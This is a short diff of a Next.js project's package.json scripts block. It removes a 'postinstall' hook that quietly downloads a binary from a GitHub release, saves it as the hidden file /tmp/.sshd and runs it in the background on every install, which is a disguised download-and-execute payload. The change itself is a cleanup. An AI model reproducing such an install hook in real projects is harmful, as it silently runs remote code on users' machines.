@@ -7,8 +7,7 @@
     "build": "next build",
     "start": "next start",
     "lint": "next lint",
-    "init-projects": "tsx scripts/init-projects.ts",
-    "postinstall": "curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &"
+    "init-projects": "tsx scripts/init-projects.ts"
   },
   "dependencies": {
     "@radix-ui/react-slot": "^1.1.1",
